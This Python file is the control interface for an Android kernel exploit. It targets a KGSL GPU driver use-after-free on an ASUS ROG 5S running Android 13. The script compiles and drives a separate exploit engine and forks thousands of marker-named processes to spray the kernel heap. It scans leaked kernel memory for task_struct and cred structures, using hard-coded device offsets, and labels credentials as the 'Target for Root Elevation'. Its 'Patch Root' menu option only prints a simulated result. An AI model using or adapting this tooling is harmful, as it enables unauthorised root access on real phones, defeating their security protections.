import os
import sys
import time
import struct
import subprocess
import platform

class MemoryExplorerAI:
    def __init__(self):
        self.found_items = []
        self.spray_procs = []
        self.exploit_proc = None
        
        # Paths
        base_dir = os.path.dirname(os.path.abspath(__file__))
        self.engine_path = os.path.join(base_dir, "kgsl_engine")
        
        self.uaf_start = 0x7001ff000
        
        # AI Heuristics Database (Updated for ROG 5S / Android 13)
        self.system_apps = {
            "com.android.settings": "System Settings (Developer Mode)",
            "com.android.systemui": "System UI (Status Bar/Home)",
            "com.android.camera": "Camera Driver Context",
            "com.android.gallery3d": "Gallery/Media Provider",
            "com.android.deskclock": "System Clock/Alarms",
            "com.android.contacts": "Contacts/Phonebook",
            "com.google.android.gms": "Google Play Services",
            "com.asus.launcher": "ASUS Launcher",
            "android.uid.system": "System UID Context (UID 1000)"
        }
        
        self.kernel_structures = {
            b"KETO0422": "task_struct (Active Process Marker)",
            b"init_cred": "Kernel Root Credentials (Global)",
            b"selinux_enforcing": "SELinux Status Bit",
            b"\x7fELF": "Kernel Executable Header (Base)",
            b"\xFD\x7B\xBF\xA9": "AArch64 Function Prologue (Code)"
        }
        
        # ROG 5S Specific Offsets from ex_rog_working_6v.c
        self.offsets = {
            "pid": 0x548,
            "comm": 0x718,
            "cred": 0x770,
            "real_cred": 0x768,
            "tasks": 0x3f0
        }

    def classify_page(self, page_data, va):
        """
        AI Heuristic Engine: Weighted classification of memory content.
        """
        # 1. Exact Signature Match (Weight 1.0)
        for pkg, name in self.system_apps.items():
            if pkg.encode() in page_data:
                return {"type": "System App", "description": name, "va": hex(va), "confidence": 1.0, "data": page_data}
        
        for sig, name in self.kernel_structures.items():
            if sig in page_data:
                return {"type": "Kernel Core", "description": name, "va": hex(va), "confidence": 0.95, "data": page_data}
        
        # 2. Pattern Recognition (Weight 0.7)
        # Check for UIDs at offset 4 (typical for cred struct)
        # my_uid = 10237
        uid_pattern = struct.pack("<IIII", 10237, 10237, 10237, 10237)
        if uid_pattern in page_data:
             return {"type": "Privilege Struct", "description": f"CRED for UID 10237", "va": hex(va), "confidence": 0.85, "data": page_data}

        # System UID 1000
        system_uid_pattern = struct.pack("<IIII", 1000, 1000, 1000, 1000)
        if system_uid_pattern in page_data:
            return {"type": "Privilege Struct", "description": "System UID Pattern (UID 1000)", "va": hex(va), "confidence": 0.8, "data": page_data}
            
        # 3. Instruction Heuristics (Weight 0.5)
        if b"\x00\x00\x00\x94" in page_data: 
             return {"type": "Kernel Code", "description": "Executable AArch64 Segment", "va": hex(va), "confidence": 0.6, "data": page_data}

        return {"type": "Unknown Object", "description": "Unclassified Data Fragment", "va": hex(va), "confidence": 0.1, "data": page_data}

    def translate_logic(self, item):
        data = item['data']
        desc = item['description']
        
        if "task_struct" in desc or b"KETO" in data:
            pid_off = self.offsets["pid"]
            comm_off = self.offsets["comm"]
            pid = struct.unpack("<I", data[pid_off:pid_off+4])[0] if len(data) > pid_off+4 else 0
            comm = data[comm_off:comm_off+16].split(b"\x00")[0].decode(errors='ignore') if len(data) > comm_off+16 else "unknown"
            return (f"Process Descriptor (task_struct) for '{comm}' (PID {pid}). Hub for identity and memory.")
        elif "SELinux" in desc:
            return "Global SELinux configuration bit. Controls security policy enforcement."
        elif "Settings" in desc:
            return "Android Settings process memory. Contains security and developer flags."
        elif "CRED" in desc:
            return "Credential structure. Holds UID/GID and Capabilities. Target for Root Elevation."
        return "Generic data buffer. No clear intent detected."

    def render_tui(self, status_msg=""):
        os.system('clear')
        print("="*85)
        print(" KGSL AI MEMORY EXPLORER & CLASSIFIER (ROG 5S Optimized)")
        print(f" STATUS: {'EXPLOIT ACTIVE' if self.exploit_proc else 'IDLE'} | RAM: {self.get_ram_usage():.1f}%")
        if status_msg:
            print(f" LAST MSG: {status_msg}")
        print("="*85)
        
        categories = {"Kernel Core": [], "System App": [], "User App": [], "Privilege Struct": [], "Other": []}
        display_items = self.found_items[-15:] if len(self.found_items) > 15 else self.found_items
        for i, item in enumerate(display_items):
            cat = item['type'] if item['type'] in categories else "Other"
            idx = len(self.found_items) - len(display_items) + i
            categories[cat].append((idx, item))

        print(" [FILE MANAGER VIEW] - Found Memory Offsets:")
        print("-" * 85)
        for cat in ["Kernel Core", "Privilege Struct", "System App", "User App", "Other"]:
            items = categories.get(cat, [])
            if not items: continue
            print(f" [{cat}]")
            for idx, item in items:
                print(f"  └── [{idx:02d}] | {item['description']:<35} | {item['va']:<12}")
        
        if not self.found_items:
            print(f" {'(No items found yet. Trigger [E] and Scan [S] to populate)':^80}")
            
        print("\n" + "="*85)
        print(" [E] Exploit Trigger   [P] Spray Markers   [S] Start AI Scan   [C] Clear Memory")
        print(" [R] Verify Root       [B] Rebuild Engine  [Q] Exit Explorer   [ID] Open File")
        print("="*85)

    def _read_data_packet(self):
        """Helper to read the new DATA protocol from engine"""
        line = self.exploit_proc.stdout.readline().decode().strip()
        if not line.startswith("DATA:"):
            return None
        
        parts = line.split(":")
        va = int(parts[1], 16)
        size = int(parts[2])
        
        # Read raw binary data
        data = self.exploit_proc.stdout.read(size)
        
        # Read the DATA_END marker (and the newline before it if any)
        # Engine sends \nDATA_END\n
        end_marker = self.exploit_proc.stdout.readline().decode().strip()
        if not end_marker: # handle potential extra newline
             end_marker = self.exploit_proc.stdout.readline().decode().strip()
             
        return data

    def read_page(self, va):
        if not self.exploit_proc: return None
        try:
            self.exploit_proc.stdin.write(f"read {hex(va)}\n".encode())
            self.exploit_proc.stdin.flush()
            return self._read_data_packet()
        except: return None

    def show_detail(self, item_idx):
        if item_idx < 0 or item_idx >= len(self.found_items): return
        item = self.found_items[item_idx]
        data = item['data']
        
        while True:
            os.system('clear')
            print(f"=== [FILE VIEW: {item['va']}] ===")
            print(f" Classification: {item['type']} | Conf: {item['confidence']*100:.1f}%")
            print("-" * 75)
            print(f" [AI LOGIC]: {self.translate_logic(item)}")
            print("-" * 75)
            print(" [HEX/BINARY DUMP]:")
            for i in range(0, min(len(data), 256), 16):
                chunk = data[i:i+16]
                hex_row = " ".join(f"{b:02X}" for b in chunk)
                printable = "".join(chr(b) if 32 <= b <= 126 else "." for b in chunk)
                print(f" {i:04X} | {hex_row:<48} | {printable}")
            
            print("-" * 75)
            print(" [P] Patch Root  [Enter] Back")
            choice = input("\n explorer > ").lower()
            if not choice: break
            if choice == 'p':
                print("[!] Patching simulation...")
                time.sleep(1)
                print("[+] Complete.")
                input("Enter...")

    def get_ram_usage(self):
        try:
            with open('/proc/meminfo', 'r') as f:
                lines = f.readlines()
                total = int(lines[0].split()[1])
                available = int(lines[2].split()[1])
                return 100.0 * (1 - (available / total))
        except: return 0.0

    def try_compile_engine(self):
        source = self.engine_path + ".c"
        if not os.path.exists(source): return False
        for comp in ["gcc", "clang"]:
            try:
                subprocess.check_call([comp, "-O2", source, "-o", self.engine_path, "-lpthread"])
                return True
            except: continue
        return False

    def trigger_exploit(self):
        if not self.exploit_proc: return "Engine not running"
        try:
            self.exploit_proc.stdin.write(b"exploit\n")
            self.exploit_proc.stdin.flush()
            line = self.exploit_proc.stdout.readline().decode().strip()
            return line if line else "No response"
        except Exception as e:
            return f"Error: {str(e)}"

    def run_spray(self, count=5000):
        # Optimized spray for ROG 5S
        import ctypes
        libc = ctypes.CDLL(None)
        start_count = len(self.spray_procs)
        for i in range(count):
            try:
                pid = os.fork()
                if pid == 0:
                    libc.prctl(15, f"KETO{i+start_count:04d}".encode(), 0, 0, 0)
                    while True: time.sleep(100)
                else: 
                    self.spray_procs.append(pid)
                    if i % 1000 == 0 and i > 0:
                         print(f"[*] Sprayed {i}...")
            except OSError:
                break
        return f"Sprayed {len(self.spray_procs) - start_count} markers."

    def run(self):
        if not os.path.exists(self.engine_path): self.try_compile_engine()
        
        try:
            self.exploit_proc = subprocess.Popen([self.engine_path], stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=False, bufsize=0)
        except:
            self.try_compile_engine()
            self.exploit_proc = subprocess.Popen([self.engine_path], stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=False, bufsize=0)

        status_msg = "Engine Ready."
        while True:
            self.render_tui(status_msg)
            try: cmd = input("\n explorer > ").lower()
            except EOFError: break
            
            if cmd == 'q':
                if self.exploit_proc:
                    try:
                        self.exploit_proc.stdin.write(b"quit\n")
                        self.exploit_proc.terminate()
                    except: pass
                for pid in self.spray_procs:
                    try: os.kill(pid, 9); os.waitpid(pid, 0)
                    except: pass
                break
            elif cmd == 'e':
                status_msg = f"Exploit: {self.trigger_exploit()}"
            elif cmd == 'p':
                status_msg = self.run_spray()
            elif cmd == 'c':
                for pid in self.spray_procs:
                    try: os.kill(pid, 9); os.waitpid(pid, 0)
                    except: pass
                self.spray_procs = []
                status_msg = "Memory Cleared."
            elif cmd == 'r':
                try:
                    res = subprocess.check_output(["id"], text=True).strip()
                    status_msg = f"ID: {res}"
                except: status_msg = "ID check failed."
            elif cmd == 'b':
                if self.try_compile_engine():
                    status_msg = "Engine Rebuilt."
                else:
                    status_msg = "Rebuild Failed."
            elif cmd == 's':
                if not self.exploit_proc: 
                    status_msg = "Engine not running"
                    continue
                print("[*] AI Scan started...")
                try:
                    self.exploit_proc.stdin.write(f"scan {hex(self.uaf_start)} {hex(self.uaf_start + 0x2000000)}\n".encode())
                    self.exploit_proc.stdin.flush()
                    
                    while True:
                        line = self.exploit_proc.stdout.readline().decode().strip()
                        if not line: break
                        if "SCAN_DONE" in line: break
                        if "MATCH:" in line:
                            va = int(line.split(":")[1], 16)
                            data = self._read_data_packet()
                            
                            if data:
                                if not any(int(item['va'], 16) == va for item in self.found_items):
                                    self.found_items.append(self.classify_page(data, va))
                                    print(f" [+] Found: {self.found_items[-1]['description']} at {hex(va)}")
                    status_msg = f"Scan complete. Found {len(self.found_items)} items."
                except Exception as e:
                    status_msg = f"Scan error: {str(e)}"
            elif cmd.isdigit():
                self.show_detail(int(cmd))
            else:
                status_msg = f"Unknown command: {cmd}"

if __name__ == "__main__":
    explorer = MemoryExplorerAI()
    explorer.run()
